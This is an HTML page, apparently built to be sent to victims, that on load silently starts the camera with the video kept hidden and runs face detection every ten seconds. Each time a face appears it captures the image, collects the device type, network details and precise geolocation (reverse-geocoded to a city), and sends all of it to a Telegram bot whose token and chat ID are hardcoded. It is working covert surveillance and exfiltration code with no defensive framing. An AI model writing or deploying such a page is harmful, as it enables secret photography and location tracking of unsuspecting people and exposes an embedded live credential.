<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Auto Face ‚Üí Telegram</title>
  <style>
    body { margin: 0; background: #000; overflow: hidden; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <video id="video" autoplay muted playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
  <script>
  // === KONFIGURASI BOT ===
  const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
  const CHAT_ID = "8471664635";
  const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";
  const DETECT_INTERVAL = 10000; // 10 detik
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  // ==== Fungsi pendukung ====
  function detectDevice() {
    const ua = navigator.userAgent.toLowerCase();
    let brand = "Unknown";
    if (/iphone|ipad/.test(ua)) brand = "Apple (iPhone/iPad)";
    else if (/android/.test(ua)) {
      if (/samsung/.test(ua)) brand = "Samsung";
      else if (/huawei|honor/.test(ua)) brand = "Huawei/Honor";
      else if (/xiaomi|redmi|poco/.test(ua)) brand = "Xiaomi/Poco";
      else if (/oppo/.test(ua)) brand = "OPPO";
      else if (/vivo/.test(ua)) brand = "Vivo";
      else brand = "Android (lainnya)";
    } else if (/windows/.test(ua)) brand = "Windows PC";
    else if (/macintosh/.test(ua)) brand = "MacOS";
    else if (/linux/.test(ua)) brand = "Linux";
    return brand;
  }

  function getNetworkInfo() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return {
      type: conn ? conn.effectiveType : "unknown",
      downlink: conn ? conn.downlink : "n/a"
    };
  }

  async function getLocation() {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 7000 }
      );
    });
  }

  async function reverseGeocode(lat, lon) {
    try {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
      const data = await res.json();
      const countryCode = data.address?.country_code?.toUpperCase() || "N/A";
      const country = data.address?.country || "Tidak diketahui";
      const city = data.address?.city || data.address?.town || data.address?.village || "Tidak diketahui";
      return `${city}, ${country} [${countryCode}]`;
    } catch {
      return "Tidak diketahui";
    }
  }

  async function sendToTelegram(photoBlob, caption) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", caption);
    fd.append("photo", photoBlob, "face.jpg");
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: fd
    });
  }

  // ==== Deteksi & Kirim ====
  async function captureAndSend() {
    // ambil ukuran proporsional (agar tidak gepeng)
    const w = video.videoWidth;
    const h = video.videoHeight;
    canvas.width = w;
    canvas.height = h;
    ctx.drawImage(video, 0, 0, w, h);

    const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
    if (detections.length === 0) return; // skip kalau tidak ada wajah

    const device = detectDevice();
    const net = getNetworkInfo();
    const loc = await getLocation();
    let locText = "Tidak diketahui";
    if (loc) locText = await reverseGeocode(loc.lat, loc.lon);

    const caption =
`üì∏ Deteksi Wajah Otomatis
üì± Device: ${device}
üåê Jaringan: ${net.type.toUpperCase()} (${net.downlink} Mbps)
üìç Lokasi: ${locText}
üïí ${new Date().toLocaleString("id-ID")}`;

    canvas.toBlob(async blob => {
      try {
        await sendToTelegram(blob, caption);
        console.log("‚úÖ Terkirim:", new Date().toLocaleTimeString());
      } catch (e) {
        console.error("‚ùå Gagal kirim:", e);
      }
    }, "image/jpeg", 0.9);
  }

  // ==== Inisialisasi ====
  async function init() {
    try {
      await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      await video.play();
      setInterval(captureAndSend, DETECT_INTERVAL);
    } catch (e) {
      console.error("Kamera error:", e);
    }
  }

  window.addEventListener("load", init);
  </script>
</body>
</html>
